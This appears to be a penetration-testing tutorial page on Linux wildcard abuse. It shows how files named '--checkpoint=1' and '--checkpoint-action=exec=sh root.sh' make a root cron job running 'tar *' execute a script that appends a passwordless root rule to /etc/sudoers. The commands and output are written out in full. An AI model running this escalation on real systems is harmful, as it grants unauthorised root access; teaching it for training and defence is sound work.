---
description: >-
  A wildcard character can be used as a replacement for other characters and are
  interpreted by the shell before other actions.
---

# Wildcard Abuse

<table data-header-hidden><thead><tr><th width="128"></th><th></th></tr></thead><tbody><tr><td><strong>Character</strong></td><td><strong>Significance</strong></td></tr><tr><td><code>*</code></td><td>An asterisk that can match any number of characters in a file name.</td></tr><tr><td><code>?</code></td><td>Matches a single character.</td></tr><tr><td><code>[ ]</code></td><td>Brackets enclose characters and can match any single one at the defined position.</td></tr><tr><td><code>~</code></td><td>A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.</td></tr><tr><td><code>-</code></td><td>A hyphen within brackets will denote a range of characters.</td></tr></tbody></table>

## Example

privilege escalation using the `tar` command

**Checking man page for tar command**

```shell-session
man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
```

In this scenario, we will be abusing the --checkpoint-action command which permits EXEC action to be executed when checkpoint is reached

* run arbitrary code once tar command executes

Creating files with these names, `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` is passed to `tar` as command-line options

Suppose a cron job exists which creates a archive of a root directory uisng tar command

```bash
#
#
mh dom mon dow command
*/01 * * * * cd /root && tar -zcf /tmp/backup.tar.gz *
```

> Note that the above cronjob could also be vulnerable to path abuse for `cd` and `tar` command

When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.

```shell-session
htb_student@NIX02:~$ echo 'echo "cliff.moore ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb_student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb_student@NIX02:~$ echo "" > --checkpoint=1
```

We can check and see that the necessary files were created.

```shell-session
htb_student@NIX02:~$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 cliff.moore cliff.moore    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 cliff.moore cliff.moore    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 cliff.moore cliff.moore   60 Aug 31 23:11 root.sh
```

Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.

```shell-session
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for cliff.moore on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cliff.moore may run the following commands on NIX02:
    (root) NOPASSWD: ALL
```
